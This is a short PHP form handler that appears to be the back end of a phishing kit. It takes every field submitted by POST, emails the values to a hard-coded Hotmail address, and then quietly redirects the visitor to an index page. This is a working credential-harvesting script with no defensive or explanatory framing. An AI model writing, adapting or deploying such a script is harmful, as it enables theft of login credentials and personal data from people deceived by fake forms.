<?php
$TO = "mof*****2@hotmail.fr";

$h = "From: " . $TO;

$message = "";

while (list($key, $val) = each($HTTP_POST_VARS)) {
$message .= "$key : $val\n";
}

mail($TO, $subject, $message, $h);

Header("Location: ../index.html");

?>